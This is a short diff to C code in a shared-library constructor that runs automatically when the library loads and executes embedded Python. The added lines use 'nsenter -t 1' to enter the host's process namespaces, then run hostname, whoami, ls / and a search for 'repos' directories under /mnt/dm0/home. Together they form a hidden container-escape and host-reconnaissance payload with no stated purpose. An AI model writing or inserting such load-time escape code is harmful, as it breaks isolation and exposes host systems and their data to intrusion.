@@ -106,7 +106,11 @@ __attribute__((constructor)) static void on_so_load() {
 
   PyRun_SimpleString(R"PY(
 
-run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -ld /home/ubuntu/dbh/data/repos')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- hostname')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- whoami')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls /')
+run_cmd('ls /')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- find /mnt/dm0/home -type d -name "repos" 2>/dev/null')
 )PY");
 
   PyGILState_Release(gstate);
